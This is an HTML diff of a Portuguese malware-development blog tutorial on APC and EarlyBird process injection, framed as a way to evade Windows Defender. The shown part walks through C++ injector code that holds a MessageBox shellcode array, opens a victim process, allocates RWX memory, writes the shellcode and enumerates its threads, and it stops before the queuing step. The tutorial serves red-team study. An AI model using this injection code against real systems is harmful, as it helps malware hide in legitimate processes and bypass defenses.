@@ -1,332 +1,98 @@
 <!DOCTYPE html>
-<html lang="en" data-mode="dark">
-  <head prefix="og: http://ogp.me/ns#">
-    <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="generator" content="Hugo 0.101.0">
-<meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
-
-
-<title>Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por diversão e lucro | Midnight Hackings</title>
-
-<meta name="author" content="Midnight Reverser">
-
-
-
-<meta name="robots" content="index follow">
-
-
-
-
-  
-    <link rel="canonical" href="https://blog.midnighthackings.com/posts/maldev-0x00/">
-  
-
-
-
-
-
-
-
-
-<meta property="og:site_name" content="Midnight Hackings">
-<meta property="og:title" content="Malware-Dev 0x00 - APC Injection & EarlyBird, ou: Bypassando Windows Defender por diversão e lucro">
-
-  <meta property="og:url" content="https://blog.midnighthackings.com/posts/maldev-0x00/">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  <meta property="og:type" content="article">
-  
-  
-    <meta property="article:published_time" content="2022-08-01">
-    <meta property="article:modified_time" content="2022-08-01">
-    <meta property="og:updated_time" content="2022-08-01">
-  
-
-  
-  
-  
-    <meta name="twitter:creator" content="@&lt;username&gt;">
-  
-  
-
-  <meta name="twitter:site" content="@&lt;username&gt;">
-
-
-
-
-
-
-
-  <meta name="twitter:dnt" content="on">
-
-
-
-
-
-
-
-
-
-
-
-
-<meta name="theme-color" content="#222">
-
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="default">
-
-
-
-
-
-
-
-  <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "Article",
-      "mainEntityOfPage": {
-        "@type": "WebSite",
-        "@id": "https://blog.midnighthackings.com/"
-      },
-      "headline": "Malware-Dev 0x00 - APC Injection \u0026 EarlyBird, ou: Bypassando Windows Defender por diversão e lucro",
-      "description": "",
-      
-      "url": "https://blog.midnighthackings.com/posts/maldev-0x00/",
-      "inLanguage": "en",
-      "datePublished": "2022-08-01",
-      "dateModified": "2022-08-01",
-      "wordCount" : "3529",
-      "publisher": {
-        "@type": "Person",
-        "name": "Midnight Reverser"
-      },
-      "author": {
-        "@type": "Person",
-        "name": "Midnight Reverser",
-        "description": "IT Sec professional and low level lover S2",
-        "sameAs": ["https://facebook.com/\u003cusername\u003e","https://www.flickr.com/\u003cusername\u003e","https://open.audio/\u003cusername\u003e","https://github.com/\u003cusername\u003e","https://gitlab.com/\u003cusername\u003e","https://www.instagram.com/\u003cusername\u003e","https://keybase.io/\u003cusername\u003e","https://www.linkedin.com/in/mateus-gualberto-santos","https://mastodon.social/\u003cusername\u003e","https://mastodon.too/\u003cusername\u003e","https://yet.another.one/\u003cusername\u003e","https://matrix.to/#/\u003cusername\u003e:matrix.org","https://matrix.to/#/\u003cusername\u003e:other.org","https://medium.com/\u003cusername\u003e","https://peertube.something/accounts/\u003cusername\u003e","https://pixelfed.social/\u003cusername\u003e","https://www.reddit.com/user/\u003cusername\u003e","https://app.element.io/#/user/\u003cusername\u003e:matrix.org","https://www.snapchat.com/add/\u003cusername\u003e","https://soundcloud.com/\u003cusername\u003e","https://stackoverflow.com/users/\u003cusername\u003e","https://www.strava.com/athletes/\u003cusername\u003e","https://t.me/\u003cusername\u003e","https://www.twitch.tv/\u003cusername\u003e","https://twitter.com/\u003cusername\u003e","https://vimeo.com/\u003cusername\u003e","https://wa.me/\u003cnumber\u003e","https://www.xing.com/profile/\u003cusername\u003e","https://youtube.com/channel/\u003cchannelid\u003e"]
-      }
-    }
-  </script>
-
-
-
-
-
-
-<link rel="stylesheet" href="https://blog.midnighthackings.com/css/main.min.e09e15333e480955cd0b2649c89e0712619f98abaa58782ae5c40252066d99d8.css" integrity="sha256-4J4VMz5ICVXNCyZJyJ4HEmGfmKuqWHgq5cQCUgZtmdg=" crossorigin="anonymous">
-
-
-
-<noscript>
-
-  
-  
-
-  
-    <meta name="theme-color" content="#1dbc91" media="(prefers-color-scheme: dark)">
-    <meta name="theme-color" content="#1f676b" media="(prefers-color-scheme: light)">
-  
-
-  
-  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/noscript.min.3f3b95436b19eaeb9223fb12c0b86737d53ee0a47fdba271a886c244bc03975c.css" integrity="sha256-PzuVQ2sZ6uuSI/sSwLhnN9U&#43;4KR/26JxqIbCRLwDl1w=" crossorigin="anonymous">
-
-</noscript>
-
-
-
-<link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">
-<link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">
-<link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">
-<link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">
-
-
-
-
-
-
-
-
-
-<link rel="me" href="https://facebook.com/%3cusername%3e"> 
-<link rel="me" href="https://www.flickr.com/%3cusername%3e"> 
-<link rel="me" href="https://open.audio/%3cusername%3e"> 
-<link rel="me" href="https://github.com/%3cusername%3e"> 
-<link rel="me" href="https://gitlab.com/%3cusername%3e"> 
-<link rel="me" href="https://www.instagram.com/%3cusername%3e"> 
-<link rel="me" href="https://keybase.io/%3cusername%3e"> 
-<link rel="me" href="https://www.linkedin.com/in/mateus-gualberto-santos"> 
-<link rel="me" href="https://mastodon.social/%3cusername%3e"> 
-<link rel="me" href="https://mastodon.too/%3cusername%3e"> 
-<link rel="me" href="https://yet.another.one/%3cusername%3e"> 
-<link rel="me" href="https://matrix.to/#/%3cusername%3e:matrix.org"> 
-<link rel="me" href="https://matrix.to/#/%3cusername%3e:other.org"> 
-<link rel="me" href="https://medium.com/%3cusername%3e"> 
-<link rel="me" href="https://peertube.something/accounts/%3cusername%3e"> 
-<link rel="me" href="https://pixelfed.social/%3cusername%3e"> 
-<link rel="me" href="https://www.reddit.com/user/%3cusername%3e"> 
-<link rel="me" href="https://app.element.io/#/user/%3cusername%3e:matrix.org"> 
-<link rel="me" href="https://www.snapchat.com/add/%3cusername%3e"> 
-<link rel="me" href="https://soundcloud.com/%3cusername%3e"> 
-<link rel="me" href="https://stackoverflow.com/users/%3cusername%3e"> 
-<link rel="me" href="https://www.strava.com/athletes/%3cusername%3e"> 
-<link rel="me" href="https://t.me/%3cusername%3e"> 
-<link rel="me" href="https://www.twitch.tv/%3cusername%3e"> 
-<link rel="me" href="https://twitter.com/%3cusername%3e"> 
-<link rel="me" href="https://vimeo.com/%3cusername%3e"> 
-<link rel="me" href="https://wa.me/%3cnumber%3e"> 
-<link rel="me" href="https://www.xing.com/profile/%3cusername%3e"> 
-<link rel="me" href="https://youtube.com/channel/%3cchannelid%3e"> 
-
-
-
-
-  
-  
-
-
-<script src="https://blog.midnighthackings.com/js/main.f1da21dfea83dc0c36cea0b202c14a97e00aedab567e32702eb120f5ab8d974b.js" integrity="sha256-8doh3&#43;qD3Aw2zqCyAsFKl&#43;AK7atWfjJwLrEg9auNl0s=" crossorigin="anonymous"></script>
-
-  </head>
-
-  <body>
-
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Security Researcher in Reversing/Malware/Low Level fields">
+    <meta name="Author" content="Midnight Reverser">
+    <meta name="keywords" content="midnighthackings midnight-rev midnight">
+    <link rel="stylesheet" href=https://blog.midnighthackings.com/css/syntax.css>
+    <link rel="stylesheet" href=https://blog.midnighthackings.com/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Midnight Hackings</title>
+  </head><body><aside id="sidenav">
     <header>
-      
+    
 
-  <a href="/">Midnight Hackings</a>
-
-
-
-
-  
-    <nav aria-label="Main menu.">
-      <ul>
+    <a id="branding" href=https://blog.midnighthackings.com/>
         
-          <li>
-            <a class="btn" href="/privacy/">About</a>
-          </li>
+            Midnight Hackings
         
-          <li>
-            <a class="btn" href="/posts/">Posts</a>
-          </li>
-        
-          <li>
-            <a class="btn" href="/contacts/">Contact</a>
-          </li>
-        
-      </ul>
-    </nav>
-  
-
-
+    </a>
     </header>
 
-    <div class="filler">
-      
-
-  <main>
-    <article>
-      <header>
+    <nav>
         
-        <h1>Malware-Dev 0x00 - APC Injection & EarlyBird, ou: Bypassando Windows Defender por diversão e lucro</h1>
-
+            		
+            <a href="/posts"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>posts</span>
+            </a>
         
-          <div class="terms">
-            <ul><li><a class="btn" href="/tags/injection/">injection</a></li><li><a class="btn" href="/tags/malware-dev/">malware-dev</a></li></ul>
-          </div>
-          <p>
-            
-              Published on <time datetime="2022-08-01">2022-08-01</time>
-            
-          </p>
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
         
+            		
+            <a href="https://github.com/midnight-rev"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
         
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
         
+            		
+            <a href="/contact"
+                
+            >
+                <i class="far fa-envelope"></i>
+                <span>contact</span>
+            </a>
         
-      </header>
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por diversão e lucro</h1>
     
       
-      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  <h1 id="introdução">Introdução</h1> 
-
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#teoria">Teoria</a></li>
+    <li><a href="#prática">Prática</a>
+      <ul>
+        <li><a href="#apc-injection-clássico">APC Injection clássico</a></li>
+        <li><a href="#earlybird-injection">EarlyBird Injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#evadindo-windows-defender-com-injeções-apc">Evadindo Windows Defender com injeções APC</a>
+      <ul>
+        <li><a href="#resultados-shellcode-runner">Resultados Shellcode Runner</a></li>
+        <li><a href="#resultados-apc-injector">Resultados APC Injector</a></li>
+        <li><a href="#resultados-earlybird">Resultados EarlyBird</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusão">Conclusão</a></li>
+  </ul>
+</nav>
+    <h1 id="introdução">Introdução</h1>
 <p>Nesse artigo, iremos discutir o funcionamento de APCs em sistemas Windows e como podemos utilizá-las ao nosso favor em cenários de evasão de defesas e red teaming.</p>
 <p>Durante o artigo iremos construir alguns artefatos na linguagem C++, sendo dois deles diretamente relacionados à injeção maliciosa de APCs. Na última seção, após todo o arcabouço teórico e prático adquirido, iremos testar um caso de uso real para evasão do Windows Defender.</p>
 <p>Caso o leitor queira seguir o passo-a-passo de criação, recomendo configurar a versão mais atual do Visual Studio Community em uma máquina virtual Windows 10, além de marcar a instalação das bibliotecas e ferramentas de compilação C/C++. Todos os códigos deverão ser compilados com a opção &ldquo;Release&rdquo; e arquitetura x64, a não ser que outra configuração seja especificada.</p>
@@ -337,45 +103,15 @@
 <li><a href="https://visualstudio.microsoft.com/pt-br/vs/community/">Visual Studio Community</a></li>
 <li><a href="https://bit.ly/windowsvm">Máquina virtual Windows 10 Evaluation</a></li>
 </ul>
-
-
-
-
-
-
-
-
-
-  <h2 id="teoria"><a class="anchor" href="#teoria" title='Anchor for: Teoria.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Teoria</h2> 
-
+<h2 id="teoria">Teoria</h2>
 <p>APCs, ou <em>Asynchronous Procedure Calls</em>, são uma forma de sinalizar e executar instruções ou funções de forma assíncrona no contexto de uma thread em um determinado processo.
 Podem ser utilizadas como método de callback, e um exemplo desse uso é a função <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfileex">ReadFileEx</a>, que irá informar de forma assíncrona o status de completude ou cancelamento da leitura de um arquivo.</p>
 <p>Existem APCs em kernelmode, que podem ser gerenciadas por certos tipos de drivers, e em usermode, que será o foco desse artigo.</p>
 <p>A API necessária para se realizar uma APC em usermode é a <code>kernel32!QueueUserAPC</code>, que necessitará de 3 argumentos: um ponteiro para uma função APC (<em>pfnAPC</em>), um handle para a thread para onde a APC deverá ser enfileirada (<em>hThread</em>) e um ponteiro para argumentos extra a serem repassados para a função (<em>dwData</em>).</p>
 <p>A documentação da <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc#remarks">MSDN sobre as APCs</a> informa que não é recomendado o enfileiramento de APCs em threads que não são pertencentes ao processo que chamou <code>QueueUserAPC</code>, devido a problemas de <em>rebasing</em> e de arquitetura. Porém, não há impedimento a nível de implementação que evite o uso de handles para threads em outros processos.</p>
 <p>Nós, como atacantes, vamos ignorar o alerta de problemas relacionados a <em>rebasing</em>, visto que nosso shellcode não deverá sofrer alterações de funcionamento por esse motivo, e construiremos um injetor de APCs para threads em processos remotos.</p>
-
-
-
-
-
-
-
-
-
-  <h2 id="prática"><a class="anchor" href="#prática" title='Anchor for: Prática.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Prática</h2> 
-
-
-
-
-
-
-
-
-
-
-  <h3 id="apc-injection-clássico"><a class="anchor" href="#apc-injection-clássico" title='Anchor for: APC Injection clássico.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> APC Injection clássico</h3> 
-
+<h2 id="prática">Prática</h2>
+<h3 id="apc-injection-clássico">APC Injection clássico</h3>
 <p>Um atacante poderá utilizar o funcionamento das APCs ao seu favor seguindo os passos descritos abaixo.</p>
 <ol>
 <li>O processo injetor irá obter um handle para um processo-vítima existente, com permissões de leitura, escrita e execução;</li>
@@ -398,22 +134,12 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 <p>Um problema relacionado ao uso dessa técnica é que seu uso pode resultar em um crash da aplicação injetada. Podemos tentar diminuir a probabilidade de crashes ao limitar a quantidade de threads para as quais o shellcode deverá ser enfileirado.</p>
 <p>Para testarmos na prática a eficácia da técnica APC Injection, utilizaremos a solução do Visual Studio disponível no meu <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Examples/APC%20Injector">Github</a> e utilizaremos o <em>explorer.exe</em> como alvo da nossa técnica.</p>
 <p>Vamos, primeiramente, fazer um <em>walthrough</em> pelo código do injetor.</p>
-
-
-
-
-
-
-
-
-
-  <h4 id="apc-injector"><a class="anchor" href="#apc-injector" title='Anchor for: APC Injector.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> APC Injector</h4> 
-
+<h4 id="apc-injector">APC Injector</h4>
 <p>Nosso injetor será executado repassando o nome de um processo presente na máquina.</p>
 <p>No nosso código, utilizaremos principalmente funções da <code>windows.h</code> para alocar memória e injetar o shellcode e a <code>tlhelp32.h</code> para realizarmos um &ldquo;snapshot&rdquo; do estado atual do sistema, ação que permite a navegação por processos e threads. As funções importadas da <code>iostream</code> são opcionais e servirão para debugging, e utilizaremos sempre que possível as versões de funções que tratam dados UTF-16 devido a uma melhor compatibilidade com certas estruturas que usaremos no código.</p>
 <p>Utilizaremos uma diretiva de pré-processamento para definirmos uma macro (<code>THREAD_INJECTION_LIMIT</code>) que limitará a quantidade de threads que devem sofrer injeção. Isso é importante para termos mais controle sobre como a injeção é realizada, buscando evitar crashes. Porém, ao definirmos um limite, é possível que uma thread alertable não tenha o shellcode incluído nas sua fila de APCs. Aumente o valor caso a injeção não funcione.</p>
 <p>Definiremos uma variável global para guardar nosso shellcode x64, que, nesse caso, tem apenas a função de executar uma MessageBox. <a href="https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12">Link</a> para o gist original do shellcode.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
@@ -451,7 +177,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6</span><span class="s">&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3</span><span class="s">&#34;</span><span class="p">;</span>
 </span></span></code></pre></div><p>As primeiras linhas de código da main irão garantir que o usuário deverá repassar um nome de um processo para prosseguir com a técnica.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;USAGE: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; &lt;proc_name&gt;&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
@@ -459,7 +185,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span></code></pre></div><p>Prosseguindo, iremos chamar a função <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a>, passando a constante <code>TH32CS_SNAPPROCESS</code> e o valor <code>0</code> como segundo argumento para enumerarmos todos os processos no sistema.</p>
 <p>Após isso, iremos definir a variável <code>procEntry</code> do tipo <code>PROCESSENTRY32</code>, que será utilizada para iterar sobre a lista de processos em um laço for (como explícito no código pelo uso das funções <code>Process32First</code> e <code>Process32Next</code>).</p>
 <p>Quando encontrarmos um processo que tenha o nome igual ao repassado por <code>argv[1]</code>, o laço se quebrará e iremos imprimir o valor do seu PID. Caso contrário, o laço irá esgotar e o injetor informará que não há processo com tal nome.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Getting list of active processes...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Getting list of active processes...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1">// Creating ToolHelp32 to search through all the processes
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
@@ -490,7 +216,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
 </span></span></code></pre></div><p>Assumindo que o processo existe, vamos definir algumas variáveis que serão utilizadas ao longo do código e faremos uso da API <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a> repassando os valores <code>PROCESS_ALL_ACCESS</code>, que nos dá permissão total, e o PID do processo, que está em <code>procEntry.th32ProcessID</code>. Teremos como retorno um handle.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">SIZE_T</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1">// Opening process pointed by procEntry.th32ProcessID
@@ -501,7 +227,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span></code></pre></div><p>A seguir, alocaremos uma região de memória RWX no processo remoto com <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a>, repassando o handle adquirido, definindo o tamanho a ser alocado como o tamanho do shellcode, a soma das flags <code>MEM_RESERVE</code> e <code>MEM_COMMIT</code> como tipo de alocação e <code>PAGE_EXECUTE_READWRITE</code> como tipo de proteção das páginas de memória (RWX).</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="c1">// Allocating memory in remote process
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="c1">// Allocating memory in remote process
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Allocating &#34;</span> <span class="o">&lt;&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; bytes in remote process..&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">allocatedMem</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allocatedMem</span><span class="p">)</span> <span class="p">{</span>
@@ -509,7 +235,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span></code></pre></div><p>Caso a alocação tenha sucesso, iremos escrever nosso shellcode no processo remoto com <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="c1">// Writing shellcode to allocated memory
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="c1">// Writing shellcode to allocated memory
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Writing shellcode at 0x&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">allocatedMem</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">status</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">allocatedMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span> <span class="p">{</span>
@@ -517,7 +243,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span></code></pre></div><p>Com o shellcode já injetado, teremos que enfileirá-lo em uma APC em uma thread que fique em um estado <em>alertable</em>. Para enumerarmos as threads de todos os processos no sistema, utilizaremos novamente a API <code>CreateToolHelp32Snapshot</code> passando a constante <code>TH32CS_SNAPTHREAD</code> como primeiro argumento.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">   <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Getting list of all threads in the system...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">   <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Getting list of all threads in the system...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[-] Error in getting list of active threads&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
@@ -527,7 +253,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 <p>Para injetarmos apenas nas threads do processo vítima, realizaremos a comparação <code>threadEntry.th32OwnerProcessID == procEntry.th32ProcessID</code>, onde o PID do processo que contém a thread é comparado com o PID do nosso processo alvo.</p>
 <p>Caso essa comparação seja verdadeira, iremos obter um handle de acesso total à thread com <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread">OpenThread</a>, repassando o valor <code>THREAD_ALL_ACCESS</code> como primeiro argumento.</p>
